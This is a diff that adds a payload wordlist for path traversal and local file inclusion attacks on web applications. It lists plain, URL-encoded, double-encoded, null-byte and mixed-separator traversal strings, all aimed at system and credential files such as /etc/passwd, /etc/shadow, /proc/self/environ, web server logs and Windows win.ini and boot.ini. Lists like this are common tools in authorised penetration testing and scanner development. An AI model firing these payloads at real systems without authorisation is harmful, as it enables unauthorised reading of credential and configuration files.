@@ -1,0 +1,58 @@
+# Path Traversal / LFI Payloads
+# Basic
+../
+../../
+../../../
+../../../../
+../../../../../
+
+# Linux
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+
+# URL encoded
+..%2F
+..%2F..%2F
+..%2F..%2F..%2F
+%2e%2e%2f
+%2e%2e%2f%2e%2e%2f
+
+# Double URL encoded
+..%252F
+..%252F..%252F
+%252e%252e%252f
+
+# Windows
+..\
+..\..\
+..\..\..\
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\boot.ini
+..\..\..\windows\win.ini
+..\..\..\boot.ini
+
+# Null byte (old PHP)
+../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../etc/passwd%00.png
+
+# Mixed
+....//
+....\/
+..../\
+....\
+
+# Absolute paths
+file:///etc/passwd
+/etc/passwd
+C:/Windows/win.ini
